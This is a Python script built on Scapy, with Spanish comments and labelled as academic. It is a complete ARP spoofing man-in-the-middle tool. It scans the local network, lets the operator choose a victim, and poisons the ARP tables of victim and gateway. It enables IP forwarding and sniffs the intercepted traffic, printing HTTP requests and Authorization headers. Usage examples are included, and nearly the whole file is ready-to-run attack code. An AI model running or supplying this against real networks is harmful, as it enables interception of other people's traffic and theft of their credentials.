#!/usr/bin/env python3
# ══════════════════════════════════════════════════════
#  ARP Spoofing / MitM Attack - Fines Academicos
#  Scapy version: 2.5.0
# ══════════════════════════════════════════════════════

from scapy.all import *
import time
import sys
import os
import signal
import argparse
import subprocess

# ─────────────────────────────────────────
#  CONFIGURACION POR DEFECTO
# ─────────────────────────────────────────
INTERVAL    = 1.5             # Segundos entre envios de ARP falsos

# ─────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────
def get_mac(ip, iface):
    """
    Resuelve la MAC de una IP mediante ARP request.
    Retorna None si no hay respuesta.
    """
    arp_req  = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_req, iface=iface, timeout=3, verbose=False)

    if answered:
        return answered[0][1].hwsrc
    return None

def get_default_gateway(iface):
    """
    Obtiene el gateway por defecto de la tabla de rutas.
    """
    try:
        # Leer tabla de rutas
        with open("/proc/net/route") as f:
            for line in f.readlines():
                fields = line.strip().split()
                if fields[0] == iface and fields[1] == "00000000":
                    # Convertir hex a IP
                    gateway_hex = fields[2]
                    gateway_ip = ".".join(str(int(gateway_hex[i:i+2], 16)) for i in [6,4,2,0])
                    return gateway_ip
    except:
        pass
    
    # Metodo alternativo usando ip route
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if "default" in line and iface in line:
                parts = line.split()
                for i, part in enumerate(parts):
                    if part == "via" and i+1 < len(parts):
                        return parts[i+1]
    except:
        pass
    
    return None

def get_network_range(iface):
    """
    Obtiene el rango de red de la interfaz.
    """
    try:
        import socket
        import fcntl
        import struct
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Obtener IP
        ip = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', iface[:15].encode())
        )[20:24])
        
        # Obtener mascara
        mask = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(),
            0x891b,  # SIOCGIFNETMASK
            struct.pack('256s', iface[:15].encode())
        )[20:24])
        
        # Calcular red
        ip_parts = list(map(int, ip.split('.')))
        mask_parts = list(map(int, mask.split('.')))
        network = '.'.join(str(ip_parts[i] & mask_parts[i]) for i in range(4))
        
        # Contar bits de mascara
        mask_bits = sum(bin(x).count('1') for x in mask_parts)
        
        return f"{network}/{mask_bits}"
    except:
        pass
    
    # Metodo alternativo
    try:
        result = subprocess.run(["ip", "addr", "show", iface], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if "inet " in line and "scope global" in line:
                parts = line.strip().split()
                return parts[1]  # Devuelve formato CIDR como 192.168.1.0/24
    except:
        pass
    
    return None

def scan_network(iface, network_range=None):
    """
    Escanea la red para encontrar hosts activos.
    """
    if not network_range:
        network_range = get_network_range(iface)
        if not network_range:
            print("[!] No se pudo determinar el rango de red")
            return []
    
    print(f"[*] Escaneando red {network_range} (esto puede tomar unos segundos)...")
    
    # Crear paquete ARP para todo el rango
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Enviar y recibir
    result = srp(packet, iface=iface, timeout=5, verbose=False)[0]
    
    # Procesar respuestas
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return clients

def select_victim(clients, gateway_ip, attacker_ip):
    """
    Muestra lista de hosts encontrados y permite seleccionar victima.
    """
    # Filtrar gateway y atacante
    valid_clients = [c for c in clients if c['ip'] != gateway_ip and c['ip'] != attacker_ip]
    
    if not valid_clients:
        print("[!] No se encontraron hosts activos (excluyendo gateway)")
        return None
    
    print(f"\n[+] Hosts encontrados en la red:")
    print(f"{'─'*50}")
    print(f"  {'N':<3} {'IP':<16} {'MAC':<18}")
    print(f"{'─'*50}")
    
    for i, client in enumerate(valid_clients, 1):
        print(f"  {i:<3} {client['ip']:<16} {client['mac']:<18}")
    
    print(f"{'─'*50}")
    
    while True:
        try:
            choice = input("\n[?] Selecciona numero de victima (o escribe IP manual): ").strip()
            
            # Si es un numero, seleccionar de la lista
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(valid_clients):
                    return valid_clients[idx]['ip']
                else:
                    print("[!] Numero invalido")
            else:
                # Asumir que es una IP manual
                # Validar formato basico
                parts = choice.split('.')
                if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                    return choice
                else:
                    print("[!] IP invalida")
        except KeyboardInterrupt:
            print("\n[!] Cancelado por usuario")
            sys.exit(0)
        except:
            print("[!] Entrada invalida")

def get_attacker_ip(iface):
    """Obtiene la IP del atacante."""
    try:
        import socket
        import fcntl
        import struct
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(),
            0x8915,
            struct.pack('256s', iface[:15].encode())
        )[20:24])
    except:
        return None

def enable_ip_forward():
    """Habilita el IP forwarding."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding habilitado")

def disable_ip_forward():
    """Deshabilita el IP forwarding."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding deshabilitado")

def get_attacker_mac(iface):
    """Obtiene la MAC del atacante."""
    return get_if_hwaddr(iface)

def spoof_arp(target_ip, spoof_ip, target_mac, iface):
    """Envia ARP Reply falso."""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    send(packet, iface=iface, verbose=False)

def restore_arp(target_ip, spoof_ip, target_mac, spoof_mac, iface):
    """Restaura tablas ARP."""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac
    )
    sendp(Ether(dst=target_mac) / packet, iface=iface, count=5, verbose=False)

def packet_callback(packet, victim_ip, gateway_ip):
    """Callback para mostrar trafico interceptado."""
    if packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst

        if src in (victim_ip, gateway_ip) and dst in (victim_ip, gateway_ip):
            proto = "TCP" if packet.haslayer(TCP) else \
                    "UDP" if packet.haslayer(UDP) else \
                    "ICMP" if packet.haslayer(ICMP) else "IP"

            info = ""
            if packet.haslayer(TCP):
                info = f"port {packet[TCP].sport} → {packet[TCP].dport}"
                if packet.haslayer(Raw):
                    raw = packet[Raw].load
                    try:
                        decoded = raw.decode("utf-8", errors="ignore")
                        if any(x in decoded for x in ["HTTP", "GET", "POST", "Authorization:"]):
                            print(f"\n  [HTTP] {decoded[:200]}")
                    except:
                        pass
            elif packet.haslayer(UDP):
                info = f"port {packet[UDP].sport} → {packet[UDP].dport}"

            print(f"  [{proto}] {src} → {dst}  {info}")

def start_sniff(iface, victim_ip, gateway_ip):
    """Inicia sniffing en background."""
    import threading
    filter_str = f"ip host {victim_ip} or ip host {gateway_ip}"
    t = threading.Thread(
        target=lambda: sniff(
            iface=iface,
            filter=filter_str,
            prn=lambda p: packet_callback(p, victim_ip, gateway_ip),
            store=False
        ),
        daemon=True
    )
    t.start()
    return t

def mitm_attack(iface, victim_ip=None, gateway_ip=None):
    """Funcion principal de ataque."""
    
    # Detectar gateway si no se especifico
    if not gateway_ip:
        print("[*] Detectando gateway por defecto...")
        gateway_ip = get_default_gateway(iface)
        if not gateway_ip:
            print("[!] No se pudo detectar el gateway automaticamente.")
            gateway_ip = input("[?] Ingresa la IP del gateway manualmente: ").strip()
        else:
            print(f"[+] Gateway detectado: {gateway_ip}")
    
    # Detectar victima si no se especifico
    if not victim_ip:
        print("[*] Buscando victimas en la red...")
        clients = scan_network(iface)
        
        if len(clients) <= 1:  # Solo el gateway o nada
            print("[!] No se encontraron hosts suficientes.")
            victim_ip = input("[?] Ingresa la IP de la victima manualmente: ").strip()
        else:
            victim_ip = select_victim(clients, gateway_ip, get_attacker_ip(iface))
            if not victim_ip:
                victim_ip = input("[?] Ingresa la IP de la victima manualmente: ").strip()
    
    print(f"\n[*] Configurando ataque...")
    print(f"    Interfaz: {iface}")
    print(f"    Gateway:  {gateway_ip}")
    print(f"    Victima:  {victim_ip}")

    # Resolver MACs
    print(f"\n[*] Resolviendo MAC de victima ({victim_ip})...")
    victim_mac = get_mac(victim_ip, iface)
    if not victim_mac:
        print(f"[!] No se pudo resolver la MAC de {victim_ip}")
        sys.exit(1)

    print(f"[*] Resolviendo MAC de gateway ({gateway_ip})...")
    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] No se pudo resolver la MAC de {gateway_ip}")
        sys.exit(1)

    attacker_mac = get_attacker_mac(iface)

    print(f"""
[+] Configuracion MitM:
    Atacante  : {attacker_mac}  ({iface})
    Victima   : {victim_mac}  ({victim_ip})
    Gateway   : {gateway_mac}  ({gateway_ip})
    """)

    # Habilitar forwarding
    enable_ip_forward()

    # Handler para salida limpia
    def cleanup(sig=None, frame=None):
        print("\n\n[!] Deteniendo ataque y restaurando ARP tables...")
        disable_ip_forward()

        restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac, iface)
        restore_arp(gateway_ip, victim_ip, gateway_mac, victim_mac, iface)

        print("[+] Tablas ARP restauradas.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # Iniciar sniffing
    print("[*] Iniciando captura de trafico...\n")
    start_sniff(iface, victim_ip, gateway_ip)

    # Loop de envenenamiento
    counter = [0]
    print("[*] Enviando ARP Spoofs (Ctrl+C para detener)\n")
    print(f"{'─'*55}")
    print(f"  {'TRÁFICO INTERCEPTADO':^51}")
    print(f"{'─'*55}")

    while True:
        spoof_arp(victim_ip, gateway_ip, victim_mac, iface)
        spoof_arp(gateway_ip, victim_ip, gateway_mac, iface)
        counter[0] += 1

        if counter[0] % 10 == 0:
            print(f"\n[~] Ciclos: {counter[0]} | Interval: {INTERVAL}s")

        time.sleep(INTERVAL)

# ─────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='ARP Spoofing MitM - Auto-deteccion de victimas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 arp_mitm.py -i eth0                    # Auto-detectar todo
  sudo python3 arp_mitm.py -i eth0 -g 192.168.1.1    # Gateway manual
  sudo python3 arp_mitm.py -i eth0 -v 192.168.1.10   # Victima manual
  sudo python3 arp_mitm.py -i eth0 -g 192.168.1.1 -v 192.168.1.10
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        required=True,
        help='Interfaz de red (ej: eth0, wlan0)'
    )
    parser.add_argument(
        '-g', '--gateway',
        help='IP del gateway (si no se especifica, se detecta automaticamente)'
    )
    parser.add_argument(
        '-v', '--victim',
        help='IP de la victima (si no se especifica, escanea la red)'
    )
    parser.add_argument(
        '--interval',
        type=float,
        default=INTERVAL,
        help=f'Intervalo entre ARP spoof (default: {INTERVAL}s)'
    )
    
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[!] Ejecutar como root: sudo python3 arp_mitm.py -i <interfaz>")
        sys.exit(1)

    INTERVAL = args.interval
    mitm_attack(args.interface, args.victim, args.gateway)
